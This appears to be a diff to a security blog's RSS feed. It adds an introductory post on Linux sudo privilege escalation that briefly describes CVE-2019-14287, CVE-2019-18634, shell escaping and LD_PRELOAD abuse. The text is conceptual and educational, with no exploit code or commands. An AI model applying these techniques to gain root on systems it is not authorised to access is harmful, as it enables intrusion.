+&lt;li>&lt;a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18634" target="_blank" rel="noopener"
+>MITRE CVE Details&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>Sudo Attacks</title><link>https://zerodex1.github.io/p/sudo-attacks/</link><pubDate>Thu, 23 Jan 2025 13:48:02 +0000</pubDate><guid>https://zerodex1.github.io/p/sudo-attacks/</guid><description>&lt;img src="https://zerodex1.github.io/post/sudo.jpg" alt="Featured image of post Sudo Attacks" />&lt;h1 id="introduction-to-sudo-attacks-and-privilege-escalation-on-linux">Introduction to Sudo Attacks and Privilege Escalation on Linux
+&lt;/h1>&lt;p>In the world of Linux-based operating systems, the &lt;code>sudo&lt;/code> command plays a critical role in user privilege management. It allows permitted users to execute commands as the superuser (root) or another user, as specified by the security policy. However, various vulnerabilities have been discovered in &lt;code>sudo&lt;/code> that can lead to privilege escalation, allowing unauthorized users to gain elevated access to system resources.&lt;/p>
+&lt;p>This discussion centers around several notable vulnerabilities, including CVE-2019-14287 and CVE-2019-18634, which have garnered attention for their potential to exploit the &lt;code>sudo&lt;/code> command for malicious purposes. These vulnerabilities demonstrate the importance of understanding how &lt;code>sudo&lt;/code> can be misconfigured or manipulated, leading to security breaches.&lt;/p>
+&lt;h2 id="topics-to-discuss">Topics to Discuss
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>CVE-2019-14287&lt;/strong>: CVE-2019-14287 is a vulnerability in &lt;code>sudo&lt;/code> that allows a user with restricted privileges to execute arbitrary commands as &lt;strong>root&lt;/strong>, even if they are explicitly denied in the &lt;code>sudoers&lt;/code> file. This occurs due to improper validation of the user ID (&lt;code>UID&lt;/code>) when running commands.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>CVE-2019-18634&lt;/strong>: CVE-2019-18634 is a &lt;strong>buffer overflow vulnerability&lt;/strong> in &lt;code>sudo&lt;/code> that can allow local privilege escalation. It specifically affects &lt;code>sudo&lt;/code> configurations where &lt;strong>pwfeedback&lt;/strong> is enabled, which can result in memory corruption and potentially lead to unauthorized code execution or system crashes.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Shell Escaping&lt;/strong>: This topic focuses on the concept of shell escaping in command execution, particularly when arguments passed to the shell are not properly sanitized. Attackers can craft malicious input to manipulate shell behavior, leading to unintentional command executions with elevated privileges.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>LD_PRELOAD&lt;/strong>: This is an environment variable that can be exploited to execute malicious shared libraries before any other libraries when running a program. By using &lt;code>LD_PRELOAD&lt;/code>, attackers can intercept and modify calls to system functions within programs invoked with &lt;code>sudo&lt;/code>, paving the way for privilege escalation.&lt;/p>
+&lt;/li>
+&lt;/ol></description></item></channel></rss>
